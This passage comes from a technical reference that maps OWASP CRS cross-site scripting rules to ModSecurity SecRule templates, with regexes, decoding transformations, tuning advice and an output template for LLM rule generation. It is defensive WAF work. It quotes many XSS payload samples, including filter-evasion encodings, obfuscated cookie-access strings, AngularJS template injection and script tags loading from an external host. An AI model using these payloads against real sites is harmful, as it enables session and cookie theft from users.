  "id:100941270,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Link href XSS vector detected'"
```

## 14.11 Rule 941280: BASE HREF

Detects:

```html
<base href=...>
```

This matters because `<base>` can rewrite relative URL interpretation.

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)<base[\s/+].*?href[\s/+]*=" \
  "id:100941280,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Base href XSS vector detected'"
```

## 14.12 Rule 941290: APPLET

Detects:

```html
<applet>
<applet src=...>
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)<applet[\s/+>]" \
  "id:100941290,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Applet tag XSS vector detected'"
```

## 14.13 Rule 941300: OBJECT With Executable Attributes

Detects `<object>` tags with executable or content-loading attributes:

```text
type
codetype
classid
code
data
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)<object[\s/+].*?(?:type|codetype|classid|code|data)[\s/+]*=" \
  "id:100941300,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Object tag XSS vector detected'"
```

---

# 15. Encoding Evasion Rules: 941310 and 941350

## 15.1 Rule 941310: US-ASCII Malformed Encoding

### Rule Identity

```text
Rule ID: 941310
Paranoia level: PL1
Category: US-ASCII malformed encoding XSS
Operator: @rx
Platform note: Tomcat-related / US-ASCII interpretation
```

### Detection Intent

Detect malformed US-ASCII encoding bypasses where `<` and `>` can appear as high-bit characters.

Payload family:

```text
¼script¾alert(¢XSS¢)¼/script¾
```

Core pattern:

```apache
@rx \xbc[^\xbe>]*[\xbe>]|<[^\xbe]*\xbe
```

### Rule-Generation Use

Use this concept when observed payloads include malformed high-bit ASCII characters or legacy encoding tricks.

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx \xbc[^\xbe>]*[\xbe>]|<[^\xbe]*\xbe" \
  "id:100941310,phase:2,t:none,t:urlDecodeUni,t:lowercase,t:urlDecode,t:htmlEntityDecode,t:jsDecode,deny,status:403,log,msg:'US-ASCII malformed encoding XSS detected'"
```

## 15.2 Rule 941350: UTF-7 Encoding XSS

### Rule Identity

```text
Rule ID: 941350
Paranoia level: PL1
Category: UTF-7 encoding XSS
Operator: @rx
Platform note: Internet Explorer UTF-7 behavior
```

### Detection Intent

Detect UTF-7 encoded XSS forms such as:

```text
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

Core pattern:

```apache
@rx \+ADw-.*(?:\+AD4-|>)|<.*\+AD4-
```

### Rule-Generation Use

Use this rule concept when payloads contain:

```text
+ADw-
+AD4-
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx \+ADw-.*(?:\+AD4-|>)|<.*\+AD4-" \
  "id:100941350,phase:2,t:none,t:urlDecodeUni,t:urlDecode,t:htmlEntityDecode,t:jsDecode,deny,status:403,log,msg:'UTF-7 encoded XSS detected'"
```

---

# 16. JavaScript Obfuscation Rules: 941360 and 941370

## 16.1 Rule 941360: JSFuck / Hieroglyphy Obfuscation

### Rule Identity

```text
Rule ID: 941360
Paranoia level: PL1
Category: JSFuck / Hieroglyphy obfuscation
Operator: @rx
Transformations: t:none
```

### Detection Intent

Detect JavaScript obfuscation patterns common in JSFuck and Hieroglyphy.

Core elements:

```text
!![]
!+[]
! []
```

Core regex:

```apache
@rx ![!+ ]\[\]
```

### Important ModSecurity Behavior

CRS notes:

- ModSecurity transforms `+` into a space in query strings and URLENCODE body processor contexts.
- ModSecurity does not do this for JSON.
- Therefore the rule checks for:

```text
!![]
!+[]
! []
```

### Generated Rule Pattern

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx ![!+ ]\[\]" \
  "id:100941360,phase:2,t:none,deny,status:403,log,msg:'JSFuck or Hieroglyphy XSS obfuscation detected'"
```

## 16.2 Rule 941370: JavaScript Global Variable Bypass

### Rule Identity

```text
Rule ID: 941370
Paranoia level: PL1
Category: JavaScript global variable bypass
Operator: @rx
Transformations: t:none,t:urlDecodeUni,t:compressWhitespace
```

### Detection Intent

Detect XSS bypasses using JavaScript global variables to avoid direct blacklisted strings such as `document.cookie`.

Target globals:

```text
self
document
this
top
window
```

Core regex concept:

```apache
@rx (?:self|document|this|top|window)\s*(?:/\*|[\[)]).+?(?:\]|\*/)
```

Example payload families:

```text
self["document"]["cookie"]
window["alert"](window["document"]["cookie"])
document/*foo*/./*bar*/cookie
self["al"+"ert"](self["doc"+"ument"]["coo"+"kie"])
self["\x61\x6c\x65\x72\x74"](self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"])
```

### Generated Rule Pattern

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?:self|document|this|top|window)\s*(?:/\*|[\[)]).+?(?:\]|\*/)" \
  "id:100941370,phase:2,t:none,t:urlDecodeUni,t:compressWhitespace,deny,status:403,log,msg:'JavaScript global variable XSS bypass detected'"
```

### Rule-Generation Use

Use this when payloads contain:

```text
self[
window[
document[
top[
this[
/*
*/
["document"]
["cookie"]
```

This rule family is especially useful when the observed bypass avoids direct `document.cookie` or `alert` tokens.

---

# 17. PL2 Rules: 941101, 941150, 941320, 941330, 941340, 941380

## 17.1 Rule 941101: Referer Libinjection XSS

### Rule Identity

```text
Rule ID: 941101
Paranoia level: PL2
Category: Libinjection XSS Detection
Target: REQUEST_HEADERS:Referer
Operator: @detectXSS
```

### Rule Purpose

This is a stricter sibling of rule `941100`. It applies XSS libinjection detection specifically to the Referer header.

Generated rule concept:

```apache
SecRule REQUEST_HEADERS:Referer "@detectXSS" \
  "id:100941101,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'XSS detected in Referer via libinjection'"
```

## 17.2 Rule 941150: Disallowed HTML Attributes

### Rule Identity

```text
Rule ID: 941150
Paranoia level: PL2
Category: XSS Filter Category 5
Vector: HTML attributes - src, style, href
Operator: @rx
```

### Core Pattern

```apache
@rx (?i)\b(?:s(?:tyle|rc)|href)\b[\s\S]*?=
```

This detects:

```text
style=
src=
href=
```

### Rule-Generation Use

This is broad and PL2 because `style`, `src`, and `href` often appear in benign HTML content.

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)\b(?:style|src|href)\b[\s\S]*?=" \
  "id:100941150,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Disallowed HTML attribute XSS vector detected'"
```

## 17.3 Rule 941320: HTML Tag Handler

### Rule Identity

```text
Rule ID: 941320
Paranoia level: PL2
Category: Possible XSS Attack - HTML Tag Handler
Operator: @rx
```

### Detection Intent

Detects common direct HTML injection points.

Important tag families include:

```text
a
applet
base
bgsound
body
embed
frame
frameset
iframe
img
input
link
meta
object
param
script
style
table
td
textarea
xml
xmp
svg-related tags
```

The CRS source notes many payload families:

```html
<a href=javascript:...>
<applet src="data:text/html;base64,...">
<base href=javascript:...>
<body onload=...>
<embed src=... allowScriptAccess=always>
<iframe src=javascript:...>
<img src=x onerror=...>
<link href="javascript:..." rel="stylesheet">
<meta http-equiv="refresh" content="0;url=javascript:...">
<object data=...>
<script src="data:text/javascript,alert(1)"></script>
<style type=text/javascript>alert('xss')</style>
<table background=javascript:...>
```

### Important Notes From Source Rule Comments

The source comments explain:

- Closing brackets are not required for many attacks to succeed.
- Browsers may repair malformed `<` and `>` usage.
- Browsers accept many separators between tag names and attributes.
- Payloads like `<img/src=...` are common.
- Grave accents can replace quotes as evasion.
- Links do not need to be fully qualified, for example:

```html
<script src="//ha.ckers.org/.j">
```

### Generated Rule Concept

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)<(?:a|applet|base|body|embed|frame|iframe|img|input|link|meta|object|param|script|style|table|textarea|svg|xml)\W" \
  "id:100941320,phase:2,t:none,t:urlDecodeUni,t:jsDecode,t:lowercase,deny,status:403,log,msg:'Direct HTML injection tag detected'"
```

## 17.4 Rule 941330: IE XSS Location / Name / Onerror / ValueOf Assignment Pattern

### Rule Identity

```text
Rule ID: 941330
Paranoia level: PL2
Category: IE XSS Filters
Operator: @rx
```

### Detection Intent

Detects quoted JavaScript context payloads that reference dangerous properties or functions and eventually assign or execute.

Important semantic tokens:

```text
location
name
onerror
valueOf
=
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)[\"'][ ]*(?:[^a-z0-9~_:' ]|in).*?(?:location|name|onerror|valueof).*?=" \
  "id:100941330,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:compressWhitespace,deny,status:403,log,msg:'IE-style XSS assignment vector detected'"
```

## 17.5 Rule 941340: IE XSS Dot Assignment Pattern

### Rule Identity

```text
Rule ID: 941340
Paranoia level: PL2
Category: IE XSS Filters
Operator: @rx
```

### Detection Intent

Detects quoted payloads with a dot/property access followed by assignment.

Core semantic shape:

```text
" ... . ... =
' ... . ... =
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)[\"'][ ]*(?:[^a-z0-9~_:' ]|in).+?[.].+?=" \
  "id:100941340,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:compressWhitespace,deny,status:403,log,msg:'IE-style XSS property assignment vector detected'"
```

## 17.6 Rule 941380: AngularJS Client-Side Template Injection

### Rule Identity

```text
Rule ID: 941380
Paranoia level: PL2
Category: AngularJS client-side template injection
Operator: @rx
Transformations: t:none
```

### Detection Intent

Detect AngularJS client-side template injection delimiters.

Core pattern:

```apache
@rx {{.*?}}
```

Example payload from source comments:

```text
{{constructor.constructor('alert(1)')()}}
```

URL-encoded example pattern:

```text
%7B%7Bconstructor.constructor(%27alert(1)%27)()%7D%7D
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx {{.*?}}" \
  "id:100941380,phase:2,t:none,deny,status:403,log,msg:'AngularJS client-side template injection detected'"
```

### False-Positive Risk

This rule can false positive on:

- template editors
- documentation pages
- frontend framework examples
- Mustache/Handlebars templates
- AngularJS applications that legitimately send template syntax to the server

Tune by parameter or path:

```apache
SecRule ARGS:q "@rx {{.*?}}" "id:100941381,phase:2,t:none,deny,status:403,log,msg:'AngularJS template injection in q parameter'"
```

---

# 18. Rule Inventory Table for Retrieval and Reranking

| Rule ID | PL | Operator | Main detection family | Primary transformations | Best retrieval keywords |
|---:|---:|---|---|---|---|
| 941100 | 1 | `@detectXSS` | libinjection XSS | `utf8toUnicode,urlDecodeUni,htmlEntityDecode,jsDecode,cssDecode,removeNulls` | libinjection, detectXSS, generic XSS |
| 941110 | 1 | `@rx` | script tag vector | standard XSS decode stack | script tag, `<script>`, script vector |
| 941120 | 1 | `@rx` | event handler vector | standard XSS decode stack | onerror, onload, event handler |
| 941130 | 1 | `@rx` | attribute vector | standard XSS decode stack | xlink:href, data:text/html, formaction, import, base64 |
| 941140 | 1 | `@rx` | JavaScript URI vector | standard XSS decode stack | javascript URI, url(javascript), script scheme |
| 941160 | 1 | `@rx` | NoScript HTML injection | standard XSS decode stack | HTML injection, dangerous tags, event attributes |
| 941170 | 1 | `@rx` | NoScript attribute injection | standard XSS decode stack | javascript, data, import, moz-binding |
| 941180 | 1 | `@pm` | DOM blacklist keywords | standard stack + lowercase | document.cookie, innerHTML, window.location |
| 941190 | 1 | `@rx` | style/import XSS | standard XSS decode stack | style, @import, CSS XSS |
| 941200 | 1 | `@rx` | VML frame src | standard XSS decode stack | vmlframe, src |
| 941210 | 1 | `@rx` | obfuscated `javascript:` | standard XSS decode stack | javascript URI obfuscation, entities |
| 941220 | 1 | `@rx` | obfuscated `vbscript:` | standard XSS decode stack | vbscript URI obfuscation |
| 941230 | 1 | `@rx` | `<embed>` src/type | standard XSS decode stack | embed tag, src, type |
| 941240 | 1 | `@rx` | import implementation | stack + lowercase | import implementation |
| 941250 | 1 | `@rx` | META http-equiv | standard XSS decode stack | meta refresh, http-equiv |
| 941260 | 1 | `@rx` | META charset | standard XSS decode stack | meta charset |
| 941270 | 1 | `@rx` | LINK href | standard XSS decode stack | link href |
| 941280 | 1 | `@rx` | BASE href | standard XSS decode stack | base href |
| 941290 | 1 | `@rx` | APPLET tag | standard XSS decode stack | applet |
| 941300 | 1 | `@rx` | OBJECT executable attributes | standard XSS decode stack | object data classid code |
| 941310 | 1 | `@rx` | US-ASCII malformed encoding | `urlDecodeUni,lowercase,urlDecode,htmlEntityDecode,jsDecode` | US-ASCII, malformed encoding |
| 941350 | 1 | `@rx` | UTF-7 XSS | `urlDecodeUni,urlDecode,htmlEntityDecode,jsDecode` | UTF-7, +ADw, +AD4 |
| 941360 | 1 | `@rx` | JSFuck / Hieroglyphy | `t:none` | JSFuck, Hieroglyphy, `!![]`, `!+[]` |
| 941370 | 1 | `@rx` | JS global variable bypass | `urlDecodeUni,compressWhitespace` | self, document, top, window, document.cookie bypass |
| 941101 | 2 | `@detectXSS` | Referer libinjection XSS | standard XSS decode stack | Referer, detectXSS |
| 941150 | 2 | `@rx` | disallowed HTML attributes | standard XSS decode stack | style, src, href |
| 941320 | 2 | `@rx` | direct HTML tag injection | `urlDecodeUni,jsDecode,lowercase` | HTML tag handler, img, iframe, script, object |
| 941330 | 2 | `@rx` | IE XSS property assignment | `urlDecodeUni,htmlEntityDecode,compressWhitespace` | location, name, onerror, valueOf |
| 941340 | 2 | `@rx` | IE XSS dot assignment | `urlDecodeUni,htmlEntityDecode,compressWhitespace` | dot property assignment |
| 941380 | 2 | `@rx` | AngularJS template injection | `t:none` | AngularJS, template injection, `{{}}` |

---

# 19. Bypass Technique to CRS-Inspired Rule Mapping

## 19.1 Script Tag XSS

Payload examples:

```html
<script>alert(1)</script>
<SCRIPT SRC=//evil.example/x.js>
```

Recommended CRS reference:

```text
941110
```

Generated rule pattern:

```apache
SecRule ARGS "@rx (?i)<script[^>]*>[\s\S]*?" \
  "id:110001,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Script tag XSS detected'"
```

## 19.2 Event Handler XSS

Payload examples:

```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg/onload=alert(1)>
```

Recommended CRS reference:

```text
941120
941160
```

Generated rule pattern:

```apache
SecRule ARGS "@rx (?i)[\s\"'`;\/0-9=]on[a-z]+[\s;,\(]*?=" \
  "id:110002,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'XSS event handler detected'"
```

## 19.3 JavaScript URI XSS

Payload examples:

```html
<a href=javascript:alert(1)>
<style>body{background:url(javascript:alert(1))}</style>
```

Recommended CRS reference:

```text
941140
941170
941210
```

Generated rule pattern:

```apache
SecRule ARGS "@rx (?i)(javascript\s*:|url\s*\(\s*javascript\s*:|data:text/html)" \
  "id:110003,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'JavaScript URI XSS detected'"
```

## 19.4 DOM Keyword XSS

Payload examples:

```text
document.cookie
document.write
window.location
.innerHTML
```

Recommended CRS reference:

```text
941180
941370
```

Generated rule pattern:

```apache
SecRule ARGS "@pm document.cookie document.write .innerhtml window.location" \
  "id:110004,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls,deny,status:403,log,msg:'DOM XSS keyword detected'"
```

## 19.5 HTML Entity or URL Encoded XSS

Payload examples:

```text
%3Cscript%3Ealert(1)%3C/script%3E
&lt;script&gt;alert(1)&lt;/script&gt;
&#x3c;svg onload=alert(1)&#x3e;
```

Recommended transformations:

```apache
t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls
```

Generated rule pattern:

```apache
SecRule ARGS "@rx (?i)<\s*(script|svg|img)\b|onerror\s*=|javascript\s*:" \
  "id:110005,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Encoded XSS payload detected after normalization'"
```

## 19.6 US-ASCII or UTF-7 Encoding XSS

Payload examples:

```text
¼script¾alert(¢XSS¢)¼/script¾
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

Recommended CRS references:

```text
941310
941350
```

Generated rule pattern:

```apache
SecRule ARGS "@rx \xbc[^\xbe>]*[\xbe>]|<[^\xbe]*\xbe|\+ADw-.*(?:\+AD4-|>)|<.*\+AD4-" \
  "id:110006,phase:2,t:none,t:urlDecodeUni,t:urlDecode,t:htmlEntityDecode,t:jsDecode,deny,status:403,log,msg:'Legacy encoded XSS payload detected'"
```

## 19.7 JSFuck / Hieroglyphy XSS

Payload examples:

```text
!![]
!+[]
! []
```

Recommended CRS reference:

```text
941360
```

Generated rule pattern:

```apache
SecRule ARGS "@rx ![!+ ]\[\]" \
  "id:110007,phase:2,t:none,deny,status:403,log,msg:'JSFuck or Hieroglyphy obfuscation detected'"
```

## 19.8 JavaScript Global Variable Bypass

Payload examples:

```text
self["document"]["cookie"]
window["alert"](window["document"]["cookie"])
document/*foo*/./*bar*/cookie
```

Recommended CRS reference:

```text
941370
```

Generated rule pattern:

```apache
SecRule ARGS "@rx (?:self|document|this|top|window)\s*(?:/\*|[\[)]).+?(?:\]|\*/)" \
  "id:110008,phase:2,t:none,t:urlDecodeUni,t:compressWhitespace,deny,status:403,log,msg:'JavaScript global variable XSS bypass detected'"
```

## 19.9 AngularJS Client-Side Template Injection

Payload examples:

```text
{{constructor.constructor('alert(1)')()}}
{{7*7}}
```

Recommended CRS reference:

```text
941380
```

Generated rule pattern:

```apache
SecRule ARGS "@rx {{.*?}}" \
  "id:110009,phase:2,t:none,deny,status:403,log,msg:'AngularJS client-side template injection detected'"
```

---

# 20. CRS-Style Generated Rule Templates

## 20.1 Standalone Immediate-Block XSS Rule

Use for a custom rule outside CRS anomaly scoring.

```apache
SecRule ARGS:q "@rx (?i)<\s*script\b|onerror\s*=|onload\s*=|javascript\s*:" \
  "id:120001,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,auditlog,msg:'XSS payload detected in q parameter',tag:'attack-xss',severity:'CRITICAL'"
```

## 20.2 CRS-Compatible Anomaly-Scoring XSS Rule

Use when adding a rule to a CRS-style anomaly-scoring deployment.

```apache
SecRule ARGS:q "@rx (?i)<\s*script\b|onerror\s*=|onload\s*=|javascript\s*:" \
  "id:120002,\
  phase:2,\
  block,\
  capture,\
  t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,\
  msg:'XSS payload detected in q parameter',\
  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
  tag:'application-multi',\
  tag:'language-multi',\
  tag:'platform-multi',\
  tag:'attack-xss',\
  tag:'paranoia-level/1',\
  tag:'OWASP_CRS',\
  tag:'capec/1000/152/242',\
  ctl:auditLogParts=+E,\
  ver:'OWASP_CRS/3.3.7-compatible',\
  severity:'CRITICAL',\
  setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\
  setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
```

## 20.3 Monitoring-Only XSS Rule

Use before blocking if false positives are unknown.

```apache
SecRule ARGS "@rx (?i)<\s*script\b|onerror\s*=|javascript\s*:" \
  "id:120003,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,pass,log,auditlog,msg:'Potential XSS payload observed - monitoring only',tag:'attack-xss',severity:'NOTICE'"
```

## 20.4 Target-Exclusion Tuned Rule

Use when a field legitimately accepts HTML.

```apache
SecRule ARGS|!ARGS:content "@rx (?i)<\s*script\b|onerror\s*=|javascript\s*:" \
  "id:120004,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,auditlog,msg:'XSS payload detected outside content parameter',tag:'attack-xss',severity:'CRITICAL'"
```

## 20.5 Chained Path-Scoped Rule

Use when the attack is only relevant to a specific endpoint.

```apache
SecRule REQUEST_URI "@beginsWith /search" \
  "id:120005,phase:2,t:none,chain,deny,status:403,log,auditlog,msg:'XSS detected on search endpoint',tag:'attack-xss',severity:'CRITICAL'"
  SecRule ARGS:q "@rx (?i)<\s*script\b|onerror\s*=|javascript\s*:" "t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls"
```

---

# 21. False Positive and Tuning Guidance

## 21.1 High False-Positive Rule Families

| Rule family | False-positive risk |
|---|---|
| 941150 `style/src/href` | Benign HTML content often contains these attributes. |
| 941160 broad HTML injection | CMS, docs, rich-text editors, and templates may contain tags/events. |
| 941180 DOM keywords | Developer docs and code snippets may contain `document.cookie` or `innerHTML`. |
| 941320 broad tag handler | HTML content fields may legitimately contain many listed tags. |
| 941380 AngularJS `{{...}}` | Template editors and frontend frameworks may send braces legitimately. |

## 21.2 Safe Tuning Techniques

### Target a specific parameter

```apache
SecRule ARGS:q "@rx (?i)<\s*script\b|onerror\s*=" "id:130001,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,deny,status:403"
```

### Exclude a known safe parameter

```apache
SecRule ARGS|!ARGS:content "@rx (?i)<\s*script\b|onerror\s*=" "id:130002,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,deny,status:403"
```

### Exclude analytics cookies

```apache
REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/
```

### Use monitoring before blocking

```apache
pass,log,auditlog
```

### Use anomaly scoring instead of immediate deny

```apache
setvar:'tx.xss_score=+%{tx.critical_anomaly_score}'
setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'
```

## 21.3 False-Positive Checklist

- [ ] Does the target include rich-text fields?
- [ ] Does the application accept HTML snippets?
- [ ] Does the application accept JavaScript examples?
- [ ] Does the endpoint serve developer documentation?
- [ ] Are template expressions such as `{{...}}` legitimate?
- [ ] Are analytics cookies excluded?
- [ ] Is the Referer header too noisy for PL1?
- [ ] Should the rule be PL2 instead of PL1?
- [ ] Should the rule be log-only before enforcement?
- [ ] Can the target be narrowed to a specific parameter, cookie, header, or path?

---

# 22. External Reference-Derived XSS Knowledge Integrated for Rule Generation

## 22.1 XSS Filter Evasion Payload Families

Useful evasion families to consider during rule generation:

| Evasion family | Rule-generation implication |
|---|---|
| Carriage returns, newlines, tabs inside `javascript:` | Use regex with flexible whitespace and entity decoding. |
| Null bytes inside JavaScript schemes | Include `t:removeNulls`. |
| HTML entities such as `&#x3c;`, `&#60;`, `&lt;` | Include `t:htmlEntityDecode`. |
| JavaScript escapes such as `\x3c`, `\u003c` | Include `t:jsDecode`. |
| CSS escapes in style contexts | Include `t:cssDecode`. |
| SVG `onload` and IMG `onerror` | Include event-handler detection. |
| META refresh to JavaScript URI | Include META / JavaScript URI rules. |
| `data:text/html` and Base64 payloads | Include `data:` and `;base64` detection. |
| US-ASCII malformed encoding | Include 941310-like detection. |
| UTF-7 encoding | Include 941350-like detection. |

## 22.2 JavaScript Global Variable Bypass

Payloads can avoid direct strings such as `document.cookie` or `alert` by using global objects and bracket notation:

```text
window["document"]["cookie"]
self["al"+"ert"](self["doc"+"ument"]["coo"+"kie"])
self["\x61\x6c\x65\x72\x74"](self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"])
```

Rule-generation implication:

- Do not only match `document.cookie`.
- Include rule `941370`-style detection when payloads contain `self`, `window`, `top`, `this`, or `document` followed by brackets or comments.
- Use `t:urlDecodeUni` and `t:compressWhitespace`.

## 22.3 AngularJS Client-Side Template Injection

AngularJS client-side template injection can execute expressions when user input is embedded into a page that AngularJS processes.

Important payload family:

```text
{{constructor.constructor('alert(1)')()}}
```

Rule-generation implication:

- Rule `941380` detects the broad `{{...}}` shape.
- Because this broad pattern can false positive on template content, scope it to vulnerable parameters or paths.
- Use `t:none` if detecting literal template delimiters.

---

# 23. RAG Retrieval Keywords

Use these natural keywords in document sections and retrieval queries to improve semantic matching.

## 23.1 XSS Attack Keywords

```text
XSS
cross-site scripting
HTML injection
script tag
event handler
onerror
onload
onclick
javascript URI
vbscript URI
data URI
base64
HTML entity
URL encoding
JS escape
CSS escape
US-ASCII encoding
UTF-7 encoding
JSFuck
Hieroglyphy
AngularJS template injection
client-side template injection
DOM keyword
document.cookie
innerHTML
window.location
```

## 23.2 ModSecurity Rule Keywords

```text
SecRule
REQUEST_COOKIES
REQUEST_COOKIES_NAMES
REQUEST_HEADERS
REQUEST_HEADERS:User-Agent
REQUEST_HEADERS:Referer
ARGS
ARGS_NAMES
XML:/*
@detectXSS
@rx
@pm
t:none
t:utf8toUnicode
t:urlDecodeUni
t:htmlEntityDecode
t:jsDecode
t:cssDecode
t:removeNulls
t:compressWhitespace
capture
block
deny
status:403
log
auditlog
setvar
tx.xss_score
tx.anomaly_score_pl1
tx.anomaly_score_pl2
paranoia-level/1
paranoia-level/2
OWASP_CRS
CRITICAL
```

## 23.3 Retrieval Query Examples

For script tag XSS:

```text
ModSecurity CRS XSS script tag SecRule @rx urlDecodeUni htmlEntityDecode jsDecode cssDecode removeNulls
```

For event handler XSS:

```text
ModSecurity CRS XSS onerror onload event handler SecRule ARGS REQUEST_HEADERS REQUEST_COOKIES
```

For JavaScript URI:

```text
ModSecurity CRS javascript URI XSS url(javascript) data:text/html SecRule transformations
```

For encoded XSS:

```text
ModSecurity CRS encoded XSS HTML entity URL encoded UTF-7 US-ASCII t:urlDecodeUni t:htmlEntityDecode
```

For AngularJS template injection:

```text
ModSecurity CRS AngularJS client side template injection constructor.constructor {{ }} SecRule
```

---

# 24. Final Rule Generation Checklist

## 24.1 Variable Checklist

- [ ] Use `ARGS` for any request argument value.
- [ ] Use `ARGS_NAMES` for argument names.
- [ ] Use `ARGS:param` for a known vulnerable parameter.
- [ ] Use `REQUEST_HEADERS:User-Agent` for User-Agent payloads.
- [ ] Use `REQUEST_HEADERS:Referer` only when Referer inspection is intended.
- [ ] Use `REQUEST_COOKIES` and `REQUEST_COOKIES_NAMES` for cookie payloads.
- [ ] Exclude analytics cookies such as `__utm` when using CRS-style targets.
- [ ] Use `XML:/*` only when XML body processing is relevant.
- [ ] Avoid broad targets if the exact parameter/header is known.

## 24.2 Operator Checklist

- [ ] Use `@detectXSS` for libinjection-style detection.
- [ ] Use `@rx` for regex-based XSS families.
- [ ] Use `@pm` for phrase lists such as DOM keyword detection.
- [ ] Use `@contains` for one stable literal indicator.
- [ ] Use `@beginsWith` or `@endsWith` for path scoping, not for payload detection.
- [ ] Use capture with regex when logging the matched substring is useful.

## 24.3 Transformation Checklist

- [ ] Start with `t:none`.
- [ ] Use `t:utf8toUnicode` for CRS-style XSS normalization.
- [ ] Use `t:urlDecodeUni` for URL-encoded payloads.
- [ ] Use `t:htmlEntityDecode` for HTML entity payloads.
- [ ] Use `t:jsDecode` for JavaScript escape payloads.
- [ ] Use `t:cssDecode` for CSS escape payloads.
- [ ] Use `t:removeNulls` for null-byte evasion.
- [ ] Use `t:compressWhitespace` for whitespace/comment-style obfuscation.
- [ ] Use `t:none` only for exact syntax rules such as JSFuck or AngularJS delimiter detection.

## 24.4 Action and Metadata Checklist

- [ ] Include unique `id`.
- [ ] Include `phase:2` for most request-body/argument XSS rules.
- [ ] Include `block` for CRS anomaly-scoring style.
- [ ] Use `deny,status:403` for standalone immediate-block rules.
- [ ] Include `capture` for regex rules if `TX.0` logging is needed.
- [ ] Include `msg`.
- [ ] Include `logdata`.
- [ ] Include `tag:'attack-xss'`.
- [ ] Include `tag:'paranoia-level/1'` or `tag:'paranoia-level/2'`.
- [ ] Include `severity:'CRITICAL'` for high-confidence XSS.
- [ ] Include `setvar:'tx.xss_score=+%{tx.critical_anomaly_score}'`.
- [ ] Include the correct PL anomaly score variable.
- [ ] Include `ctl:auditLogParts=+E` if request body evidence should be available in audit logs.

## 24.5 Tuning Checklist

- [ ] Add `!ARGS:param` exclusions only for known-safe parameters.
- [ ] Add cookie exclusions for analytics cookies where appropriate.
- [ ] Use path-scoped chained rules if the vulnerable endpoint is known.
- [ ] Use `pass,log,auditlog` before blocking broad rules.
- [ ] Treat PL2 rules as stricter and higher false-positive risk.
- [ ] Generate regression tests for each new CRS-style rule.
- [ ] Include positive tests for malicious payloads.
- [ ] Include negative tests for benign HTML/code/template content.

---

# 25. Final Output Template for LLM Rule Generation

When this document is retrieved, generate ModSecurity output in this structure:

```markdown
## Rule Objective

- Attack type:
- Payload location:
- Observed bypass:
- Enforcement goal:

## Selected CRS Reference

- Rule IDs:
- Pattern family:
- Why these references apply:

